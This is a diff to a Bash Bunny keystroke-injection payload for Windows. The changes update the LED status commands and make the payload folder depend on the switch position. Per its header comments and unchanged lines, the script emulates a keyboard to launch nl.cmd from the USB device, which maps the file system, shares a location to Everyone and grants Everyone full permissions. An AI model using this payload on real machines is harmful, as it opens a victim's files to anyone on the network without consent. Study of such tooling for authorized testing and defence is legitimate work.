@@ -4,18 +4,18 @@
 # Author:        StinkyBliss
 # Version:       1.0
 # Target:        Windows
-# 
-# 
+#
+#
 # Maps the file system and stores it in c:\users\tempa
 # Shares a location to everyone and grants full security permissions to everyone
-# 
+#
 # For testing use: 'icacls "c:\Users" /remove:g Everyone /T' to remove the created security permissions
 # To share a drive change the path in nl.cmd to c: remove the quotes
 
-LED R 200
+LED SETUP
+GET SWITCH_POSITION
 
-# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
-source bunny_helpers.sh
+LED STAGE1
 
 ATTACKMODE HID
 
@@ -30,12 +30,12 @@ Q DELAY 1000
 Q LEFT
 Q ENTER
 
-LED R G 200
+LED STAGE2
 
 ATTACKMODE HID STORAGE
 
 # Start nl.cmd
-Q STRING ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch1\nl.cmd')"
+Q STRING ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\${SWITCH_POSITION}\nl.cmd')"
 Q ENTER
 
 # Wait for nl.cmd and exit
@@ -45,4 +45,4 @@ Q ENTER
 
 sync
 
-LED G
+LED FINISH
